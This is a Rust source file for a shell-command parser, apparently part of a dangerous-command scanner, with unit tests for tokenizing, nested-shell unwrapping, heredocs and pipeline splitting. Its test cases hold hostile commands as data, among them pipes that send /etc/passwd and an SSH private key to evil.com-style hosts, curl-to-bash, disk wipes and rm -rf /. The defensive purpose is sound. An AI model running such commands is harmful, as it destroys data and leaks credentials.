// Parser: tokenizer, heredoc, inline scripts
#![allow(dead_code)]

mod embedded_scripts;
mod nested_shells;
mod segmentation;
mod tokenizer;

use std::fmt;

pub use embedded_scripts::{
    HeredocBody, InlineScript, extract_eval_payloads, extract_heredoc_bodies,
    extract_inline_scripts, extract_process_substitution_bodies,
};
pub use nested_shells::extract_nested_commands;
pub use segmentation::{logical_segments, top_level_pipelines};
pub use tokenizer::split_tokens;

// ── T2.4: ParsedCommand struct and public API ─────────────────────────────────

/// The result of parsing a raw shell command string.
///
/// Captures the first executable, its arguments, any inline scripts detected
/// inside the command, and the original raw string for audit purposes.
#[derive(Debug, Clone, PartialEq)]
pub struct ParsedCommand {
    /// The first token of the command (e.g. `rm`, `git`, `bash`).
    /// `None` only when the input string is empty or consists solely of separators.
    pub executable: Option<String>,
    /// All argument tokens after the executable (separators stripped).
    pub args: Vec<String>,
    /// Inline scripts extracted from interpreter invocations (python -c, node -e, etc.).
    pub inline_scripts: Vec<InlineScript>,
    /// The original, unmodified command string.
    pub raw: String,
}

/// One top-level segment within a pipeline chain.
///
/// `raw` preserves the original shell spelling for diagnostics, while
/// `normalized` joins shell tokens with single spaces so downstream matching can
/// reason about neighboring pipeline stages without quote noise.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PipelineSegment {
    pub raw: String,
    pub normalized: String,
}

/// A top-level shell pipeline chain such as `cmd1 | cmd2 | cmd3`.
///
/// Chains are delimited only by top-level control operators other than the
/// single pipe (`;`, `&&`, `||`, newlines). This preserves adjacency between
/// neighboring pipeline stages for semantic analysis.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PipelineChain {
    pub raw: String,
    pub segments: Vec<PipelineSegment>,
}

impl fmt::Display for ParsedCommand {
    /// Formats the command for audit log output.
    ///
    /// Shows `executable [args...]` if parsing succeeded, or falls back to
    /// the raw string if no executable was found.
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match &self.executable {
            Some(exe) if !self.args.is_empty() => {
                write!(f, "{} {}", exe, self.args.join(" "))
            }
            Some(exe) => write!(f, "{}", exe),
            None => write!(f, "{}", self.raw),
        }
    }
}

/// A stateless parser that converts raw shell command strings into [`ParsedCommand`].
pub struct Parser;

impl Parser {
    /// Parse `cmd` into a [`ParsedCommand`].
    ///
    /// Extracts the executable and argument list from the first logical command
    /// in `cmd` (stopping at shell separators `&&`, `||`, `;`, `|`), and also
    /// collects any inline scripts found anywhere in `cmd`.
    pub fn parse(cmd: &str) -> ParsedCommand {
        let tokens = split_tokens(cmd);

        // Take only the tokens belonging to the first sub-command.
        let first_cmd: Vec<&String> = tokens
            .iter()
            .take_while(|t| !matches!(t.as_str(), ";" | "&&" | "||" | "|"))
            .collect();

        let executable = first_cmd.first().map(|s| s.to_string());
        let args: Vec<String> = first_cmd.iter().skip(1).map(|s| s.to_string()).collect();
        let inline_scripts = extract_inline_scripts(cmd);

        ParsedCommand {
            executable,
            args,
            inline_scripts,
            raw: cmd.to_string(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // 1. Simple command — space-separated words
    #[test]
    fn simple_command() {
        assert_eq!(split_tokens("echo hello"), vec!["echo", "hello"]);
    }

    // 2. Multiple arguments
    #[test]
    fn multiple_args() {
        assert_eq!(split_tokens("ls -la /tmp"), vec!["ls", "-la", "/tmp"]);
    }

    // 3. Single-quoted string becomes one token
    #[test]
    fn single_quoted_token() {
        assert_eq!(
            split_tokens("echo 'hello world'"),
            vec!["echo", "hello world"]
        );
    }

    // 4. Dangerous path in single quotes is one token
    #[test]
    fn single_quoted_dangerous_path() {
        assert_eq!(split_tokens("'rm -rf /'"), vec!["rm -rf /"]);
    }

    // 5. Double-quoted string becomes one token
    #[test]
    fn double_quoted_token() {
        assert_eq!(
            split_tokens(r#"echo "hello world""#),
            vec!["echo", "hello world"]
        );
    }

    // 6. && is a separator token
    #[test]
    fn double_ampersand_separator() {
        assert_eq!(split_tokens("cmd1 && cmd2"), vec!["cmd1", "&&", "cmd2"]);
    }

    // 7. Semicolon is a separator token
    #[test]
    fn semicolon_separator() {
        assert_eq!(split_tokens("cmd1; cmd2"), vec!["cmd1", ";", "cmd2"]);
    }

    // 8. Semicolon without surrounding spaces
    #[test]
    fn semicolon_no_spaces() {
        assert_eq!(split_tokens("cmd1;cmd2"), vec!["cmd1", ";", "cmd2"]);
    }

    // 9. Pipe is a separator token
    #[test]
    fn pipe_separator() {
        assert_eq!(
            split_tokens("ls | grep foo"),
            vec!["ls", "|", "grep", "foo"]
        );
    }

    // 10. || is a separator token
    #[test]
    fn double_pipe_separator() {
        assert_eq!(split_tokens("cmd1 || cmd2"), vec!["cmd1", "||", "cmd2"]);
    }

    // 11. Backslash escapes a space (keeps words together)
    #[test]
    fn backslash_escaped_space() {
        assert_eq!(split_tokens(r"rm\ -rf\ /"), vec!["rm -rf /"]);
    }

    // 12. && inside double quotes is NOT a separator
    #[test]
    fn ampersand_inside_double_quotes() {
        assert_eq!(
            split_tokens(r#"bash -c "cmd1 && cmd2""#),
            vec!["bash", "-c", "cmd1 && cmd2"]
        );
    }

    // 13. Single quote inside double quotes is literal
    #[test]
    fn single_quote_inside_double_quotes() {
        assert_eq!(split_tokens(r#""it's fine""#), vec!["it's fine"]);
    }

    // 14. Double quote inside single quotes is literal
    #[test]
    fn double_quote_inside_single_quotes() {
        assert_eq!(split_tokens(r#"'say "hi"'"#), vec![r#"say "hi""#]);
    }

    // 15. Empty string produces no tokens
    #[test]
    fn empty_input() {
        assert_eq!(split_tokens(""), Vec::<String>::new());
    }

    // --- T2.2: extract_nested_commands ---

    // 16. bash -c 'cmd' — single-quoted inner command
    #[test]
    fn nested_bash_single_quote() {
        assert_eq!(
            extract_nested_commands("bash -c 'echo hello'"),
            vec!["echo hello"]
        );
    }

    // 17. sh -c 'cmd' — sh variant is recognized
    #[test]
    fn nested_sh_single_quote() {
        assert_eq!(
            extract_nested_commands("sh -c 'echo hello'"),
            vec!["echo hello"]
        );
    }

    // 18. bash -c "cmd1 && cmd2" — && splits into two commands
    #[test]
    fn nested_double_quote_and_separator() {
        assert_eq!(
            extract_nested_commands(r#"bash -c "cmd1 && cmd2""#),
            vec!["cmd1", "cmd2"]
        );
    }

    // 19. bash -c "cmd1; cmd2; cmd3" — semicolons produce three commands
    #[test]
    fn nested_semicolons_three_cmds() {
        assert_eq!(
            extract_nested_commands(r#"bash -c "cmd1; cmd2; cmd3""#),
            vec!["cmd1", "cmd2", "cmd3"]
        );
    }

    // 20. bash -c $'cmd1\ncmd2' — ANSI-C $'...' quoting: \n becomes a newline separator
    #[test]
    fn nested_ansi_c_newline() {
        // In the Rust string literal "\\n" is a literal backslash-n, mirroring what the
        // shell passes when $'...' quoting embeds a \n escape.
        assert_eq!(
            extract_nested_commands("bash -c $'cmd1\\ncmd2'"),
            vec!["cmd1", "cmd2"]
        );
    }

    // 21. env VAR=val bash -c '...' — env prefix with one assignment
    #[test]
    fn nested_env_prefix_single_var() {
        assert_eq!(
            extract_nested_commands("env VAR=val bash -c 'echo hello'"),
            vec!["echo hello"]
        );
    }

    // 22. env A=1 B=2 bash -c '...' — env prefix with multiple assignments
    #[test]
    fn nested_env_prefix_multi_var() {
        assert_eq!(
            extract_nested_commands("env A=1 B=2 bash -c 'cmd'"),
            vec!["cmd"]
        );
    }

    // 23. bash -c 'bash -c "inner cmd"' — recursive unwrap preserves argument grouping
    #[test]
    fn nested_recursive_unwrap() {
        assert_eq!(
            extract_nested_commands(r#"bash -c 'bash -c "inner cmd"'"#),
            vec!["inner cmd"]
        );
    }

    // 24. python -c '...' — non-shell interpreter returns empty vec
    #[test]
    fn nested_non_shell_returns_empty() {
        assert_eq!(
            extract_nested_commands(r#"python -c 'print("hi")'"#),
            Vec::<String>::new()
        );
    }

    // 25. bash -c "cmd1 || cmd2" — || splits into two commands
    #[test]
    fn nested_double_pipe_separator() {
        assert_eq!(
            extract_nested_commands(r#"bash -c "cmd1 || cmd2""#),
            vec!["cmd1", "cmd2"]
        );
    }

    #[test]
    fn top_level_pipelines_preserve_adjacent_pipeline_stages() {
        let pipelines = super::segmentation::top_level_pipelines("printf x | xargs rm -f | cat");
        assert_eq!(pipelines.len(), 1);
        assert_eq!(pipelines[0].segments.len(), 3);
        assert_eq!(pipelines[0].segments[1].normalized, "xargs rm -f");
    }

    #[test]
    fn extract_nested_commands_unwraps_env_prefixed_shell_c() {
        assert_eq!(
            super::nested_shells::extract_nested_commands(
                "env FOO=bar bash -lc 'echo one && echo two'"
            ),
            vec!["echo one", "echo two"]
        );
    }

    #[test]
    fn split_tokens_preserves_separator_tokens() {
        assert_eq!(
            split_tokens("echo hi && rm -rf /tmp/demo | cat"),
            vec!["echo", "hi", "&&", "rm", "-rf", "/tmp/demo", "|", "cat"]
        );
    }

    #[test]
    fn parse_preserves_first_command_shape() {
        let parsed = Parser::parse("FOO=bar bash -c 'echo hi'");
        assert_eq!(parsed.executable.as_deref(), Some("FOO=bar"));
        assert_eq!(parsed.raw, "FOO=bar bash -c 'echo hi'");
    }

    #[test]
    fn extract_inline_scripts_preserves_python_c_payload() {
        let scripts = super::embedded_scripts::extract_inline_scripts("python -c 'print(1)'");
        assert_eq!(scripts.len(), 1);
        assert_eq!(scripts[0].interpreter, "python");
        assert_eq!(scripts[0].body, "print(1)");
    }

    #[test]
    fn extract_process_substitution_bodies_preserves_nested_command() {
        assert_eq!(
            super::embedded_scripts::extract_process_substitution_bodies(
                "diff <(git status) <(git diff)"
            ),
            vec!["git status", "git diff"]
        );
    }

    // ── T2.3: heredoc and inline script tests ────────────────────────────────

    // 26. Basic heredoc — body between <<EOF and EOF is extracted
    #[test]
    fn heredoc_basic_body() {
        let cmd = "cat <<EOF\nrm -rf /\nEOF";
        let bodies = extract_heredoc_bodies(cmd);
        assert_eq!(bodies.len(), 1);
        assert_eq!(bodies[0].delimiter, "EOF");
        assert_eq!(bodies[0].body, "rm -rf /");
        assert!(!bodies[0].is_nowdoc);
    }

    // 27. Nowdoc — <<'EOF' is flagged as nowdoc, body is still extracted
    #[test]
    fn heredoc_nowdoc_flag() {
        let cmd = "cat <<'EOF'\nsome secret\nEOF";
        let bodies = extract_heredoc_bodies(cmd);
        assert_eq!(bodies.len(), 1);
        assert_eq!(bodies[0].body, "some secret");
        assert!(bodies[0].is_nowdoc);
    }

    // 28. Multi-line heredoc body — all lines joined with newline
    #[test]
    fn heredoc_multiline_body() {
        let cmd = "bash <<SCRIPT\necho hello\nrm -rf /tmp/foo\nSCRIPT";
        let bodies = extract_heredoc_bodies(cmd);
        assert_eq!(bodies.len(), 1);
        assert_eq!(bodies[0].body, "echo hello\nrm -rf /tmp/foo");
    }

    // 29. Heredoc with tab-stripping (<<-) — leading tabs removed from delimiter line
    #[test]
    fn heredoc_strip_tabs_delimiter() {
        // The closing delimiter has a leading tab that should be stripped.
        let cmd = "cat <<-EOF\n\trm -rf /\n\tEOF";
        let bodies = extract_heredoc_bodies(cmd);
        assert_eq!(bodies.len(), 1);
        assert_eq!(bodies[0].delimiter, "EOF");
        // Body line is kept as-is (only the delimiter line is stripped for matching).
        assert_eq!(bodies[0].body, "\trm -rf /");
    }

    // 30. No heredoc — empty vec returned
    #[test]
    fn heredoc_no_match_returns_empty() {
        let bodies = extract_heredoc_bodies("echo hello world");
        assert!(bodies.is_empty());
    }

    // 31. python -c "..." — inline Python script extracted
    #[test]
    fn inline_script_python() {
        let scripts = extract_inline_scripts(r#"python3 -c "import os; os.system('cmd')""#);
        assert_eq!(scripts.len(), 1);
        assert_eq!(scripts[0].interpreter, "python3");
        assert_eq!(scripts[0].body, "import os; os.system('cmd')");
    }

    // 32. node -e "..." — inline Node.js script extracted
    #[test]
    fn inline_script_node() {
        let scripts = extract_inline_scripts(r#"node -e "process.exit(1)""#);
        assert_eq!(scripts.len(), 1);
        assert_eq!(scripts[0].interpreter, "node");
        assert_eq!(scripts[0].body, "process.exit(1)");
    }

    // 33. ruby -e "..." — inline Ruby script extracted
    #[test]
    fn inline_script_ruby() {
        let scripts = extract_inline_scripts(r#"ruby -e "system('rm -rf /')""#);
        assert_eq!(scripts.len(), 1);
        assert_eq!(scripts[0].interpreter, "ruby");
        assert_eq!(scripts[0].body, "system('rm -rf /')");
    }

    #[test]
    fn inline_script_stays_within_logical_segment_boundary() {
        let scripts = extract_inline_scripts(r#"ruby puts(1) && node -e "process.exit(1)""#);
        assert_eq!(
            scripts,
            vec![InlineScript {
                interpreter: "node".to_string(),
                body: "process.exit(1)".to_string(),
            }]
        );
    }

    #[test]
    fn process_substitution_body_basic() {
        let bodies = extract_process_substitution_bodies(r#"source <(python3 -c "print(42)")"#);
        assert_eq!(bodies, vec![r#"python3 -c "print(42)""#]);
    }

    #[test]
    fn process_substitution_body_nested_parens() {
        let bodies = extract_process_substitution_bodies(r#"bash <(printf '%s\n' "$(echo hi)")"#);
        assert_eq!(bodies, vec![r#"printf '%s\n' "$(echo hi)""#]);
    }

    #[test]
    fn eval_payload_literal_string() {
        let payloads = extract_eval_payloads(r#"eval "python3 -c 'print(42)'"#);
        assert_eq!(payloads, vec![r#"python3 -c 'print(42)'"#]);
    }

    #[test]
    fn eval_payload_with_env_prefix() {
        let payloads = extract_eval_payloads(r#"FOO=bar eval "$DEPLOY_CMD""#);
        assert_eq!(payloads, vec![r#"$DEPLOY_CMD"#]);
    }

    // ── T2.4: ParsedCommand and Parser::parse ────────────────────────────────

    // 34. Simple command — executable and args split correctly
    #[test]
    fn parse_simple_command() {
        let p = Parser::parse("ls -la /tmp");
        assert_eq!(p.executable.as_deref(), Some("ls"));
        assert_eq!(p.args, vec!["-la", "/tmp"]);
        assert!(p.inline_scripts.is_empty());
        assert_eq!(p.raw, "ls -la /tmp");
    }

    // 35. Only executable, no args
    #[test]
    fn parse_no_args() {
        let p = Parser::parse("pwd");
        assert_eq!(p.executable.as_deref(), Some("pwd"));
        assert!(p.args.is_empty());
    }

    // 36. Empty input — executable is None
    #[test]
    fn parse_empty_input() {
        let p = Parser::parse("");
        assert_eq!(p.executable, None);
        assert!(p.args.is_empty());
    }

    // 37. Command with separators — only first sub-command is parsed
    #[test]
    fn parse_first_subcommand_only() {
        let p = Parser::parse("echo hello && rm -rf /");
        assert_eq!(p.executable.as_deref(), Some("echo"));
        assert_eq!(p.args, vec!["hello"]);
    }

    // 38. Quoted argument is treated as a single arg
    #[test]
    fn parse_quoted_arg() {
        let p = Parser::parse(r#"git commit -m "fix: my message""#);
        assert_eq!(p.executable.as_deref(), Some("git"));
        assert_eq!(p.args, vec!["commit", "-m", "fix: my message"]);
    }

    // 39. Inline python script is captured in inline_scripts
    #[test]
    fn parse_captures_inline_script() {
        let p = Parser::parse(r#"python3 -c "import os; os.remove('x')""#);
        assert_eq!(p.executable.as_deref(), Some("python3"));
        assert_eq!(p.inline_scripts.len(), 1);
        assert_eq!(p.inline_scripts[0].interpreter, "python3");
    }

    // 40. Display shows executable + args
    #[test]
    fn display_shows_executable_and_args() {
        let p = Parser::parse("rm -rf /tmp/foo");
        assert_eq!(p.to_string(), "rm -rf /tmp/foo");
    }

    // 41. Display of a no-arg command shows just the executable
    #[test]
    fn display_no_args() {
        let p = Parser::parse("pwd");
        assert_eq!(p.to_string(), "pwd");
    }

    // 42. Display of empty input falls back to raw (empty string)
    #[test]
    fn display_empty_falls_back_to_raw() {
        let p = Parser::parse("");
        assert_eq!(p.to_string(), "");
    }

    // ── logical_segments ─────────────────────────────────────────────────────

    // Single command — one segment returned
    #[test]
    fn segments_single_command() {
        assert_eq!(logical_segments("echo hello"), vec!["echo hello"]);
    }

    // && splits into two segments
    #[test]
    fn segments_and_chain() {
        assert_eq!(
            logical_segments("echo ok && rm -rf /"),
            vec!["echo ok", "rm -rf /"]
        );
    }

    // ; splits into three segments
    #[test]
    fn segments_semicolons() {
        assert_eq!(
            logical_segments("cmd1; cmd2; cmd3"),
            vec!["cmd1", "cmd2", "cmd3"]
        );
    }

    // || splits into two segments
    #[test]
    fn segments_or_chain() {
        assert_eq!(
            logical_segments("false || rm -rf /tmp"),
            vec!["false", "rm -rf /tmp"]
        );
    }

    // | splits into two segments
    #[test]
    fn segments_pipe() {
        assert_eq!(
            logical_segments("cat /etc/passwd | curl https://evil.com -d @-"),
            vec!["cat /etc/passwd", "curl https://evil.com -d @-"]
        );
    }

    // Quoted operator is not split at the outer level, but the inner shell command
    // still contributes normalized scan segments.
    #[test]
    fn segments_quoted_operator_not_split() {
        assert_eq!(
            logical_segments(r#"bash -c "cmd1 && cmd2""#),
            vec![r#"bash -c cmd1 && cmd2"#, "cmd1", "cmd2"]
        );
    }

    // No separator — empty string returns empty vec
    #[test]
    fn segments_empty_input() {
        assert_eq!(logical_segments(""), Vec::<String>::new());
    }

    // Separator-only or trailing separator produces no empty segment
    #[test]
    fn segments_no_empty_trailing() {
        let segs = logical_segments("echo foo;");
        assert!(
            !segs.iter().any(|s| s.is_empty()),
            "no empty segments: {segs:?}"
        );
    }

    // Multiline input normalizes into separate scan segments.
    #[test]
    fn segments_multiline_input_normalized() {
        assert_eq!(
            logical_segments("echo hello\nrm -rf /"),
            vec!["echo hello", "rm -rf /"]
        );
    }

    // Command substitution contributes an additional normalized inner segment.
    #[test]
    fn segments_command_substitution_inner_command_extracted() {
        assert_eq!(
            logical_segments("echo $(rm -rf /)"),
            vec!["echo $(rm -rf /)", "rm -rf /"]
        );
    }

    // Subshell grouping contributes an additional normalized inner segment.
    #[test]
    fn segments_subshell_body_extracted() {
        assert_eq!(
            logical_segments("(rm -rf /)"),
            vec!["(rm -rf /)", "rm -rf /"]
        );
    }

    // Leading environment assignments keep the raw segment and add the executable form.
    #[test]
    fn segments_env_prefix_body_extracted() {
        assert_eq!(
            logical_segments("MY_VAR=x OTHER=y rm -rf /"),
            vec!["MY_VAR=x OTHER=y rm -rf /", "rm -rf /"]
        );
    }

    // ── Bypass-prone command form normalization ───────────────────────────────

    // 43. bash -lc: combined login+command flag — inner command extracted
    #[test]
    fn nested_bash_lc_combined_flag() {
        assert_eq!(
            extract_nested_commands("bash -lc 'rm -rf /'"),
            vec!["rm -rf /"]
        );
    }

    // 44. bash -ic: combined interactive+command flag
    #[test]
    fn nested_bash_ic_combined_flag() {
        assert_eq!(
            extract_nested_commands("bash -ic 'echo hello'"),
            vec!["echo hello"]
        );
    }

    // 45. bash --login -c: long login flag before -c — inner command extracted
    #[test]
    fn nested_bash_long_login_flag() {
        assert_eq!(
            extract_nested_commands("bash --login -c 'cmd'"),
            vec!["cmd"]
        );
    }

    // 46. VAR=val bash -c '...' without 'env' keyword — VAR=val prefix is skipped
    #[test]
    fn nested_var_prefix_without_env_keyword() {
        assert_eq!(
            extract_nested_commands("MY_VAR=secret bash -c 'echo hi'"),
            vec!["echo hi"]
        );
    }

    // 47. VAR=val dangerous_cmd — Parser::parse exposes the VAR=val token as executable.
    //     The raw string still reaches the scanner for pattern matching.
    #[test]
    fn parse_env_var_prefix_as_executable() {
        let p = Parser::parse("MY_VAR=x rm -rf /");
        assert_eq!(p.executable.as_deref(), Some("MY_VAR=x"));
        assert_eq!(p.args, vec!["rm", "-rf", "/"]);
        assert_eq!(p.raw, "MY_VAR=x rm -rf /");
    }

    // 48. Subshell (cmd): not unwrapped — raw string carries content for scanner
    #[test]
    fn parse_subshell_not_unwrapped() {
        let p = Parser::parse("(rm -rf /)");
        // subshell paren is not stripped; executable starts with '('
        assert_eq!(p.executable.as_deref(), Some("(rm"));
        // raw is preserved so the scanner regex still matches the dangerous payload
        assert_eq!(p.raw, "(rm -rf /)");
    }

    // 49. Command substitution $(cmd): not unwrapped — raw string preserved
    #[test]
    fn parse_command_substitution_raw_preserved() {
        let p = Parser::parse("echo $(rm -rf /)");
        assert_eq!(p.executable.as_deref(), Some("echo"));
        assert!(p.raw.contains("rm -rf /"));
    }

    // 50. Backtick substitution `cmd`: not unwrapped — raw string preserved
    #[test]
    fn parse_backtick_substitution_raw_preserved() {
        let p = Parser::parse("echo `whoami`");
        assert_eq!(p.executable.as_deref(), Some("echo"));
        assert!(p.raw.contains("whoami"));
    }

    // 51. Multiline input: Parser::parse stops at first sub-command; full raw preserved
    #[test]
    fn parse_multiline_first_line_only() {
        let cmd = "echo hello\nrm -rf /";
        let p = Parser::parse(cmd);
        assert_eq!(p.executable.as_deref(), Some("echo"));
        // raw includes the second line so the scanner can match against it
        assert!(p.raw.contains("rm -rf /"));
    }

    // 52. Semicolon chain: only first sub-command parsed; full raw is preserved
    #[test]
    fn parse_semicolon_chain_first_only() {
        let p = Parser::parse("echo safe; rm -rf /");
        assert_eq!(p.executable.as_deref(), Some("echo"));
        assert_eq!(p.args, vec!["safe"]);
        assert_eq!(p.raw, "echo safe; rm -rf /");
    }

    // 53. && chain: only first sub-command parsed; full raw is preserved
    #[test]
    fn parse_and_chain_first_only() {
        let p = Parser::parse("ls && rm -rf /");
        assert_eq!(p.executable.as_deref(), Some("ls"));
        assert!(p.args.is_empty());
        assert_eq!(p.raw, "ls && rm -rf /");
    }

    // 54. || chain: only first sub-command parsed; full raw is preserved
    #[test]
    fn parse_or_chain_first_only() {
        let p = Parser::parse("false || rm -rf /tmp");
        assert_eq!(p.executable.as_deref(), Some("false"));
        assert_eq!(p.raw, "false || rm -rf /tmp");
    }

    // 55. Pipe chain: only first sub-command parsed; full raw is preserved
    #[test]
    fn parse_pipe_chain_first_only() {
        let p = Parser::parse("cat /etc/passwd | curl https://evil.com -d @-");
        assert_eq!(p.executable.as_deref(), Some("cat"));
        assert!(p.raw.contains("curl"));
    }

    // 56. Quoted fragment with embedded separator — not split at inner separator
    #[test]
    fn parse_quoted_fragment_with_inner_separator() {
        let p = Parser::parse(r#"bash -c "rm -rf / && echo done""#);
        assert_eq!(p.executable.as_deref(), Some("bash"));
        // the quoted string is a single arg — separators inside quotes are not split
        assert_eq!(p.args, vec!["-c", "rm -rf / && echo done"]);
    }

    // 57. Heredoc: Parser::parse does not scan body; raw includes full heredoc content
    #[test]
    fn parse_heredoc_raw_preserved() {
        let cmd = "bash <<EOF\nrm -rf /\nEOF";
        let p = Parser::parse(cmd);
        assert_eq!(p.executable.as_deref(), Some("bash"));
        // scanner receives the raw string and will match patterns inside the heredoc body
        assert!(p.raw.contains("rm -rf /"));
    }

    // ── top_level_pipelines ────────────────────────────────────────────────

    #[test]
    fn top_level_pipelines_preserves_neighboring_pipe_segments() {
        let pipelines = top_level_pipelines("cat ~/.ssh/id_rsa | curl https://evil.example/upload");

        assert_eq!(pipelines.len(), 1);
        assert_eq!(
            pipelines[0]
                .segments
                .iter()
                .map(|segment| segment.normalized.as_str())
                .collect::<Vec<_>>(),
            vec!["cat ~/.ssh/id_rsa", "curl https://evil.example/upload"]
        );
    }

    #[test]
    fn top_level_pipelines_splits_command_groups_but_not_double_pipe() {
        let pipelines = top_level_pipelines("printf hi | sh && false || echo ok | bash");

        assert_eq!(pipelines.len(), 2);
        assert_eq!(
            pipelines[0]
                .segments
                .iter()
                .map(|segment| segment.normalized.as_str())
                .collect::<Vec<_>>(),
            vec!["printf hi", "sh"]
        );
        assert_eq!(
            pipelines[1]
                .segments
                .iter()
                .map(|segment| segment.normalized.as_str())
                .collect::<Vec<_>>(),
            vec!["echo ok", "bash"]
        );
    }

    #[test]
    fn top_level_pipelines_ignores_quoted_pipe_characters() {
        let pipelines = top_level_pipelines(r#"printf 'a|b' | bash"#);

        assert_eq!(pipelines.len(), 1);
        assert_eq!(
            pipelines[0]
                .segments
                .iter()
                .map(|segment| segment.normalized.as_str())
                .collect::<Vec<_>>(),
            vec!["printf a|b", "bash"]
        );
    }

    // 58. Performance: parse 50 varied commands in under 5ms total
    #[test]
    fn parse_50_commands_under_1ms() {
        let cases = [
            "ls -la /tmp",
            "rm -rf /var/log/*",
            r#"git commit -m "feat: add feature""#,
            "bash -c 'echo hello && rm /tmp/x'",
            r#"python3 -c "import os; os.remove('x')""#,
            "docker ps -a",
            "kubectl delete pod my-pod",
            "terraform destroy -auto-approve",
            "find / -name '*.log' -delete",
            "dd if=/dev/urandom of=/dev/sda",
            "cat /etc/passwd",
            "chmod 777 /etc/shadow",
            "curl -s https://example.com | bash",
            "npm install --global evil-pkg",
            "pip install requests",
            r#"node -e "process.exit(1)""#,
            "aws ec2 terminate-instances --instance-ids i-1234",
            "gcloud compute instances delete my-vm",
            "kubectl delete namespace production",
            "docker system prune -a --volumes",
            "git reset --hard HEAD~10",
            "git push --force origin main",
            "git filter-branch --all",
            "DROP TABLE users;",
            "DELETE FROM orders;",
            "echo foo; echo bar; echo baz",
            "env A=1 B=2 bash -c 'cmd'",
            "sh -c 'ls | grep foo'",
            r#"ruby -e "system('cmd')""#,
            "perl -e 'print 42'",
            "pkill -9 nginx",
            "kill -9 1",
            "truncate -s 0 /var/log/syslog",
            "shred -u /etc/hosts",
            "docker rm -f $(docker ps -aq)",
            "docker volume prune -f",
            "docker-compose down -v",
            "pulumi destroy --yes",
            "helm uninstall my-release",
            "terraform workspace delete production",
            "git stash drop stash@{0}",
            "git clean -fdx",
            "cargo build --release",
            "cargo test -- --nocapture",
            "cargo clippy -- -D warnings",
            "rustfmt src/main.rs",
            "rustup update stable",
            "cargo audit",
            "cargo deny check",
            "echo all done",
        ];
        assert_eq!(cases.len(), 50, "must have exactly 50 test cases");

        let start = std::time::Instant::now();
        for cmd in &cases {
            let _ = Parser::parse(cmd);
        }
        let elapsed = start.elapsed();
        assert!(
            elapsed.as_millis() < 5,
            "50 parses took {}µs, expected < 5ms (run criterion benchmarks for precise numbers)",
            elapsed.as_micros()
        );
    }
}
